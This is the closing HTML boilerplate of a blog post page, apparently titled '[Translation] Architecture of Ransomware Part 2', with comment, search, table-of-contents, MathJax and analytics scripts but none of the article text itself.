          var d = document,
            s = d.createElement('script');
          s.src = '//' + 'hackyboiz' + '.disqus.com/embed.js';
          s.setAttribute('data-timestamp', new Date());
          (d.head || d.body).appendChild(s);
        })();
      }
      waitElementVisible('disqus_thread', loadDisqus);
    </script>
    <noscript>Please enable JavaScript to view the
      <a target="_blank" href="https://disqus.com/?ref_noscript" rel="external nofollow noopener noreferrer">comments powered by Disqus.</a>
    </noscript>
  </div>


            </article>
            
          </article>
        </div>
      </div>
    </div>
    
    <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
      <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div id="tocbot"></div>
</div>

    </div>
    
  </div>
</div>

<!-- Custom -->

    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="external nofollow noopener noreferrer"><span>Hexo</span></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="external nofollow noopener noreferrer">
        <span>Fluid</span></a>
    </div>
    

    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
<script src="/js/debouncer.js"></script>
<script src="/js/main.js"></script>

<!-- Plugins -->


  
    <script src="/js/lazyload.js"></script>
  



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
  <script src="/js/clipboard-use.js"></script>







  <script src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js"></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '#post-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "[Translation] Architecture of Ransomware Part 2&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js"></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>





  

  
    <!-- MathJax -->
    <script>
      MathJax = {
        tex: {
          inlineMath: [['$', '$'], ['\\(', '\\)']]
        },
        options: {
          renderActions: {
            findScript: [10, doc => {
              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
                const display = !!node.type.match(/; *mode=display/);
                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
                const text = document.createTextNode('');
                node.parentNode.replaceChild(text, node);
                math.start = { node: text, delim: '', n: 0 };
                math.end = { node: text, delim: '', n: 0 };
                doc.math.push(math);
              });
            }, '', false],
            insertedScript: [200, () => {
              document.querySelectorAll('mjx-container').forEach(node => {
                let target = node.parentNode;
                if (target.nodeName.toLowerCase() === 'li') {
                  target.parentNode.classList.add('has-jax');
                }
              });
            }, '', false]
          }
        }
      };
    </script>

    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>

  













  

  
    <!-- Google Analytics -->
    <script defer>
      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
      ga.l = +new Date;
      ga('create', 'UA-177243668-2', 'auto');
      ga('send', 'pageview');
    </script>
    <script async src="https://www.google-analytics.com/analytics.js"></script>
  

  
    <!-- Google gtag.js -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-177243668-2"></script>
    <script defer>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-177243668-2');
    </script>
  

  

  

  





</body>
</html>
